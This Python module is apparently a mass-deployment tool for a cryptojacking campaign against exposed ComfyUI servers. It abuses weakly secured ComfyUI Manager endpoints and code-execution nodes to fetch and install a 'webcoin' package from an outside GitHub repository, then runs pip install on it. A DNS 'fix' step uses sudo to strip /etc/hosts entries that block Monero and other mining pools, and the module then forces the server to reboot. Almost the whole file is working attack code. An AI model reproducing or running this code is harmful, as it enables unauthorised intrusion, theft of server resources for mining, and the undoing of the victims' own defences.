"""
Installation pipeline — multi-strategy install with intelligent fallbacks.

Strategy order:
  1. Manager direct git install (if security allows)
  2. Manager queue install (multiple payload formats)
  3. Code execution: git clone via best available node
  4. Code execution: zip download fallback
  5. Post-install: update to latest, pip install, DNS fix
"""

from __future__ import annotations
from typing import Callable

from . import http_client as http
from . import executor
from .discovery import ServerProfile, discover

LOG_CB = Callable[[str], None]

REPO_URL = "https://github.com/bossman79/webcoin.git"
REPO_BARE = "https://github.com/bossman79/webcoin"
REPO_ZIP = "https://github.com/bossman79/webcoin/archive/refs/heads/master.zip"


def _log(cb: LOG_CB | None, msg: str):
    if cb:
        cb(msg)


def _is_plausible_custom_nodes_path(cn: str) -> bool:
    """Heuristic: accept POSIX + Windows absolute paths; reject bare labels."""
    s = (cn or "").strip()
    if len(s) < 3:
        return False
    if s.startswith("\\\\") or s.startswith("\\\\?\\"):
        return True
    if "/" in s or "\\" in s:
        return True
    return len(s) > 1 and s[1] == ":"


# ─── Remote code templates ───────────────────────────────────────────

# Prefer folder_paths (true ComfyUI path in-process), then well-known locations,
# then shallow path guesses only (no os.walk — too slow for deploy client polls).
FIND_CUSTOM_NODES = r'''import os
def _find():
    try:
        import folder_paths
        if hasattr(folder_paths, "get_folder_paths"):
            cns = folder_paths.get_folder_paths("custom_nodes")
            if cns is not None:
                if not isinstance(cns, (list, tuple)):
                    cns = [cns]
                for c in cns:
                    if c and os.path.isdir(c):
                        return c
        fp = getattr(folder_paths, "__file__", None)
        if fp:
            d = os.path.join(os.path.dirname(fp), "custom_nodes")
            if os.path.isdir(d):
                return d
    except Exception:
        pass
    for g in (
        "/app/ComfyUI/custom_nodes", "/opt/ComfyUI/custom_nodes",
        "/root/ComfyUI/custom_nodes", "/workspace/ComfyUI/custom_nodes",
        "/data/ComfyUI/custom_nodes", "/basedir/custom_nodes",
        "/comfy/ComfyUI/custom_nodes", "/usr/local/ComfyUI/custom_nodes",
        "/mnt/ComfyUI/custom_nodes", "/export/ComfyUI/custom_nodes",
        "/home/user/ComfyUI/custom_nodes", "/home/ubuntu/ComfyUI/custom_nodes",
        "/var/ComfyUI/custom_nodes",
    ):
        if os.path.isdir(g):
            return g
    tails = ("ComfyUI/custom_nodes", "comfyui/custom_nodes", "ComfyUI/ComfyUI/custom_nodes")
    for base in ("/root", "/app", "/data", "/workspace", "/opt", "/srv", "/export", "/mnt", "/var"):
        if not os.path.isdir(base):
            continue
        for t in tails:
            p = os.path.join(base, *t.split("/"))
            if os.path.isdir(p):
                return p
    try:
        home = os.path.expanduser("~")
        for t in tails:
            p = os.path.join(home, *t.split("/"))
            if os.path.isdir(p):
                return p
    except Exception:
        pass
    return ""
return _find()
'''

CHECK_WEBCOIN = r'''import os
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
has_init = os.path.isfile(os.path.join(wc, "__init__.py"))
if has_init:
    import subprocess
    r = subprocess.run(["git", "-C", wc, "log", "--oneline", "-1"],
                       capture_output=True, text=True, timeout=10)
    commit = r.stdout.strip() if r.returncode == 0 else "unknown"
    return f"installed|{{commit}}"
return "not_installed"
'''

GIT_CLONE = r'''import subprocess, os
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
if os.path.isdir(wc):
    import shutil
    shutil.rmtree(wc, ignore_errors=True)
r = subprocess.run(
    ["git", "clone", "{repo_url}", "webcoin"],
    cwd=cn, capture_output=True, text=True, timeout=120
)
lines = [f"exit={r.returncode}"]
if r.stderr.strip():
    lines.append(r.stderr.strip()[:300])
has_init = os.path.isfile(os.path.join(wc, "__init__.py"))
lines.append(f"installed={has_init}")
if has_init:
    req = os.path.join(wc, "requirements.txt")
    if os.path.isfile(req):
        r2 = subprocess.run(["pip", "install", "-r", req],
                            capture_output=True, text=True, timeout=120)
        lines.append(f"pip={r2.returncode}")
return "\n".join(lines)
'''

GIT_UPDATE = r'''import subprocess, os
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
r1 = subprocess.run(["git", "-C", wc, "fetch", "--all"],
                     capture_output=True, text=True, timeout=30)
r2 = subprocess.run(["git", "-C", wc, "reset", "--hard", "origin/master"],
                     capture_output=True, text=True, timeout=30)
r3 = subprocess.run(["git", "-C", wc, "log", "--oneline", "-1"],
                     capture_output=True, text=True, timeout=10)
commit = r3.stdout.strip()
resilience = os.path.isfile(os.path.join(wc, "core", "resilience.py"))
cache_dir = os.path.isfile(os.path.join(wc, "core", "cache_dir.py"))
return f"fetch={r1.returncode}|reset={r2.returncode}|commit={commit}|resilience={resilience}|cache_dir={cache_dir}"
'''

ZIP_INSTALL = r'''import subprocess, os, urllib.request, zipfile, shutil
cn = "{cn_path}"
wc = os.path.join(cn, "webcoin")
if os.path.isdir(wc):
    shutil.rmtree(wc, ignore_errors=True)
zip_url = "{zip_url}"
zip_path = os.path.join(cn, "_wc_tmp.zip")
try:
    urllib.request.urlretrieve(zip_url, zip_path)
    with zipfile.ZipFile(zip_path, "r") as zf:
        zf.extractall(cn)
    extracted = os.path.join(cn, "webcoin-master")
    if os.path.isdir(extracted):
        os.rename(extracted, wc)
    os.unlink(zip_path)
    has_init = os.path.isfile(os.path.join(wc, "__init__.py"))
    if has_init:
        req = os.path.join(wc, "requirements.txt")
        if os.path.isfile(req):
            subprocess.run(["pip", "install", "-r", req],
                           capture_output=True, text=True, timeout=120)
    return f"installed={has_init}"
except Exception as e:
    return f"zip_error={e}"
'''

DNS_FIX = r'''import subprocess, socket, os
lines = []
pools = ["gulf.moneroocean.stream", "rvn.2miners.com", "etchash.unmineable.com"]
blocked = []
for host in pools:
    try:
        ip = socket.getaddrinfo(host, None, socket.AF_INET)[0][4][0]
        lines.append(f"{host} -> {ip}")
        if ip.startswith("0.") or ip == "127.0.0.1":
            blocked.append(host)
    except Exception as e:
        lines.append(f"{host} -> FAIL: {e}")
        blocked.append(host)
if blocked:
    lines.append("Blocked pools detected, fixing /etc/hosts ...")
    try:
        with open("/etc/hosts") as f:
            content = f.read()
        new_lines = []
        for line in content.splitlines():
            if any(p in line for p in pools) and "0.0.0.0" in line:
                continue
            new_lines.append(line)
        with open("/tmp/_hosts_fixed", "w") as f:
            f.write("\n".join(new_lines) + "\n")
        subprocess.run(["sudo", "-n", "cp", "/tmp/_hosts_fixed", "/etc/hosts"],
                       capture_output=True, timeout=10)
        subprocess.run(["sudo", "-n", "systemctl", "restart", "systemd-resolved"],
                       capture_output=True, timeout=10)
        lines.append("Fixed /etc/hosts and flushed DNS")
    except Exception as e:
        lines.append(f"Fix failed: {e}")
else:
    lines.append("DNS OK — no blocked pools")
return "\n".join(lines)
'''


# ─── Manager-based strategies ────────────────────────────────────────

def _strategy_manager_direct(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Try POST /customnode/install/git_url (requires weak security)."""
    base = profile.base_url
    _log(log, "[strategy] Manager direct git install ...")

    code, body = http.post(
        f"{base}/customnode/install/git_url",
        data={"url": REPO_URL},
        timeout=30,
    )
    if code == 200:
        _log(log, "  Direct install accepted (200)")
        _start_queue(profile, log)
        return True

    _log(log, f"  Direct install failed ({code})")
    return False


def _strategy_manager_queue(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Try multiple /manager/queue/install payload formats."""
    base = profile.base_url
    _log(log, "[strategy] Manager queue install ...")

    payloads = [
        {"url": REPO_URL, "version": "unknown"},
        {"url": REPO_BARE, "version": "unknown"},
        {"custom_nodes": [{"url": REPO_URL}]},
    ]

    for i, payload in enumerate(payloads):
        code, _ = http.post(f"{base}/manager/queue/install", data=payload, timeout=15)
        if code == 200:
            _log(log, f"  Queue payload {i} accepted")
            _start_queue(profile, log)
            return True
        _log(log, f"  Queue payload {i} -> {code}")

    return False


def _start_queue(profile: ServerProfile, log: LOG_CB | None):
    """Kick off queue processing and wait."""
    base = profile.base_url
    http.post(f"{base}/manager/queue/start", timeout=10)
    _log(log, "  Waiting for queue task ...")
    import time
    time.sleep(15)
    code, data = http.get_json(f"{base}/manager/queue/status", timeout=10)
    if data:
        _log(log, f"  Queue status: {data}")


# ─── Code-execution strategies ───────────────────────────────────────

def _find_custom_nodes(profile: ServerProfile, log: LOG_CB | None) -> str:
    """Discover the custom_nodes path on the remote server."""
    if profile.custom_nodes_path:
        return profile.custom_nodes_path

    if profile.custom_nodes_search_attempted:
        if not profile.custom_nodes_reuse_hint_logged:
            profile.custom_nodes_reuse_hint_logged = True
            _log(
                log,
                "  custom_nodes: skipping further probes this run (already attempted)",
            )
        return ""

    profile.custom_nodes_search_attempted = True
    _log(log, "[strategy] Finding custom_nodes directory ...")
    result = executor.execute(profile, FIND_CUSTOM_NODES, log=log)
    if result and result.strip():
        cn = result.strip().splitlines()[-1].strip()
        if _is_plausible_custom_nodes_path(cn):
            profile.custom_nodes_path = cn
            _log(log, f"  custom_nodes: {cn}")
            return cn

    _log(log, "  Could not find custom_nodes directory")
    return ""


def _strategy_code_clone(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Git clone via code execution node."""
    cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    _log(log, "[strategy] Git clone via code execution ...")
    code = GIT_CLONE.replace("{cn_path}", cn).replace("{repo_url}", REPO_URL)
    result = executor.execute(profile, code, log=log, timeout=45)
    if result and "installed=True" in result:
        _log(log, "  Git clone successful")
        return True

    _log(log, f"  Git clone result: {result}")
    return False


def _strategy_code_zip(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Download zip from GitHub when git fails."""
    cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    _log(log, "[strategy] Zip download fallback ...")
    code = ZIP_INSTALL.replace("{cn_path}", cn).replace("{zip_url}", REPO_ZIP)
    result = executor.execute(profile, code, log=log, timeout=60)
    if result and "installed=True" in result:
        _log(log, "  Zip install successful")
        return True

    _log(log, f"  Zip install result: {result}")
    return False


def _update_to_latest(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Git fetch + reset --hard origin/master."""
    cn = profile.custom_nodes_path
    if not cn:
        cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    _log(log, "Updating to latest commit ...")
    code = GIT_UPDATE.replace("{cn_path}", cn)
    result = executor.execute(profile, code, log=log)
    if result:
        _log(log, f"  {result}")
        profile.webcoin_commit = result.split("commit=")[-1].split("|")[0] if "commit=" in result else ""
        return "reset=0" in result
    return False


def _check_installed(profile: ServerProfile, log: LOG_CB | None) -> bool:
    """Check if webcoin is already installed."""
    cn = _find_custom_nodes(profile, log)
    if not cn:
        return False

    code = CHECK_WEBCOIN.replace("{cn_path}", cn)
    result = executor.execute(profile, code, log=log)
    if result and "installed|" in result:
        commit = result.split("|", 1)[1].strip() if "|" in result else ""
        profile.webcoin_installed = True
        profile.webcoin_commit = commit
        _log(log, f"  webcoin installed, commit: {commit}")
        return True
    return False


def _fix_dns(profile: ServerProfile, log: LOG_CB | None):
    """Check and fix DNS for mining pools."""
    _log(log, "Checking DNS for mining pools ...")
    result = executor.execute(profile, DNS_FIX, log=log)
    if result:
        for line in result.strip().splitlines():
            _log(log, f"  {line}")


# ─── Main pipeline ───────────────────────────────────────────────────

def install(ip: str, log: LOG_CB | None = None) -> tuple[ServerProfile, bool]:
    """
    Full install pipeline for one server.
    Returns (profile, success).
    """
    profile = discover(ip, log=log)
    if not profile.reachable:
        _log(log, f"FAILED: {ip} is unreachable")
        return profile, False

    has_exec = bool(profile.all_exec_nodes)

    # Check if already installed
    if has_exec and _check_installed(profile, log):
        _log(log, "webcoin already installed — updating to latest ...")
        _update_to_latest(profile, log)
        _fix_dns(profile, log)
        _log(log, f"UPDATE COMPLETE for {ip}")
        _log(log, ">> Reboot ComfyUI to activate changes <<")
        return profile, True

    # Strategy 1: Manager direct install
    if profile.has_manager:
        if _strategy_manager_direct(profile, log):
            if has_exec:
                _update_to_latest(profile, log)
                _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via Manager direct)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

        # Strategy 2: Manager queue install
        if _strategy_manager_queue(profile, log):
            if has_exec:
                _update_to_latest(profile, log)
                _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via Manager queue)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

    # Strategy 3: Code execution — git clone
    if has_exec:
        if _strategy_code_clone(profile, log):
            _update_to_latest(profile, log)
            _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via code exec git clone)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

        # Strategy 4: Code execution — zip fallback
        if _strategy_code_zip(profile, log):
            _fix_dns(profile, log)
            _log(log, f"INSTALL COMPLETE for {ip} (via zip download)")
            _log(log, ">> Reboot ComfyUI to activate changes <<")
            return profile, True

    _log(log, f"FAILED: No install strategy worked for {ip}")
    if not has_exec:
        _log(log, "  Server has no code-execution nodes available")
        _log(log, "  Manager security level blocks direct install")
        _log(log, "  Manual intervention required")
    else:
        _log(
            log,
            "  Code nodes did not return a usable custom_nodes path (or /history had no "
            "text yet). Non-standard ComfyUI layout, hardened IDENode output, or Manager "
            "install blocked — install webcoin manually on that host or fix execution output.",
        )
    return profile, False


def reboot(profile: ServerProfile, log: LOG_CB | None = None) -> bool:
    """Attempt to reboot ComfyUI via Manager."""
    base = profile.base_url
    _log(log, f"Rebooting ComfyUI on {profile.ip} ...")
    for ep in ["/manager/reboot", "/api/manager/reboot"]:
        for method in ["POST", "GET"]:
            code, _ = http.request(f"{base}{ep}", method=method, timeout=10)
            if code == 200:
                _log(log, f"  Reboot sent ({ep})")
                return True

    # Try internal reboot via code execution
    if profile.all_exec_nodes:
        _log(log, "  Manager reboot blocked, trying internal reboot ...")
        reboot_code = r'''import urllib.request
try:
    urllib.request.urlopen("http://127.0.0.1:8188/manager/reboot", timeout=5)
    return "rebooting"
except Exception:
    try:
        urllib.request.urlopen("http://127.0.0.1:8188/api/manager/reboot", timeout=5)
        return "rebooting"
    except Exception as e:
        return f"failed: {e}"
'''
        result = executor.execute(profile, reboot_code, log=log)
        if result and "rebooting" in result:
            _log(log, "  Internal reboot triggered")
            return True
        _log(log, f"  Internal reboot result: {result}")

    _log(log, "  Reboot failed — all methods blocked")
    return False
